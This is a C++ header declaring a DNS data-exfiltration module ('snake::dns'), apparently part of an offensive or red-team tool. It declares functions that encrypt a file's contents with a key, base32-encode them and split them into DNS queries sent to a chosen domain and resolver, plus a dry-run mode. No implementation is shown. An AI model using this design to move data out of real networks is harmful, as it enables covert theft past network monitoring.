#pragma once

#include <optional>
#include <string>
#include <vector>

#include "snake/crypto.hpp"

namespace snake::dns {

std::string b32_encode(const Bytes& data);

struct ExfilOptions {
    std::string domain;
    std::string resolver;
    bool dry_run = false;
    std::vector<std::string>* captured = nullptr;
};

bool exfiltrate(const Bytes& key, const Bytes& data, const std::string& filename,
                const ExfilOptions& opts);

std::vector<std::string> build_queries(const Bytes& key, const Bytes& data,
                                       const std::string& filename, const std::string& domain,
                                       std::string* session_out);

}  // namespace snake::dns
